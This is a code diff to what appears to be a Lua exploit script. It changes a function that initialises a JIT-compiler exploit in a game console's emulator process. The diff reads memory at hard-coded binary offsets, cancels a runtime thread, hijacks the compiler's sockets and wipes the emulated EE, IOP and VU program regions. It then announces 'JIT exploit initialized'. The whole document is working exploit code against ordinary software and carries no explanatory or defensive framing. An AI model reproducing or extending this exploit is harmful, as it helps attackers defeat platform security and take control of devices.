@@ -302,10 +302,25 @@ function jit_init()
 
     -- qword_1B8460
     BRIDGE_BASE = read64(EBOOT_BASE + 0x3A19C0)
-    SCRATCH_BASE = BRIDGE_BASE + 0x30000;
+    SCRATCH_BASE = BRIDGE_BASE + 0x30000
+   
+    EE_PROG_BASE = read64(EBOOT_BASE + 0x2DC8078) + 0x4000
+    EE_PROG_SIZE = 0x2000000 - 0x4000
+    
+    IOP_PROG_BASE = read64(EBOOT_BASE + 0x2DC8B18) + 0x4000
+    IOP_PROG_SIZE = 0x800000 - 0x4000
+    
     VU0_HEAP_BASE = read64(EBOOT_BASE + 0x3A19D0)
+    VU0_HEAP_SIZE = 0x100000
+    
     VU1_HEAP_BASE = read64(EBOOT_BASE + 0x3A19D8)
+    VU1_HEAP_SIZE = 0x400000
+    
     VU1_PROG_BASE = VU1_HEAP_BASE - 0x10F8000
+    VU1_PROG_SIZE = 0xFF8000
+    
+    VU0_PROG_BASE = VU1_PROG_BASE - 0x800000
+    VU0_PROG_SIZE = 0x7F8000
     
     ORG_MAIN_SOCK = read32(EBOOT_BASE + 0x3A1A30)
     
@@ -346,8 +361,7 @@ function jit_init()
     
     -- This terminates thread that holds ORG_MAIN_SOCK with read syscall
     -- write from compiler when doorbell 3 ends might behave weird later
-    jit_read_pthread = read64(EBOOT_BASE + 0x3A1A38)
-    scePthreadCancel(jit_read_pthread)
+    scePthreadCancel(read64(THREAD_HANDLE_RUNTIME_BRIDGE))
     
     NEW_MAIN_SOCK = jit_send_recv_fd(sock1, ORG_JIT_SOCK, ORG_MAIN_SOCK)
     if (NEW_MAIN_SOCK < 0) then
@@ -355,6 +369,11 @@ function jit_init()
     end
     
     NEW_JIT_SOCK = sock0
+    
+    jit_memset(EE_PROG_BASE, 0, EE_PROG_SIZE)
+    jit_memset(IOP_PROG_BASE, 0, IOP_PROG_SIZE)
+    jit_memset(VU0_PROG_BASE, 0, VU0_PROG_SIZE)
+    jit_memset(VU1_PROG_BASE, 0, VU1_PROG_SIZE)
     
     send_notification("JIT exploit initialized")
     return true
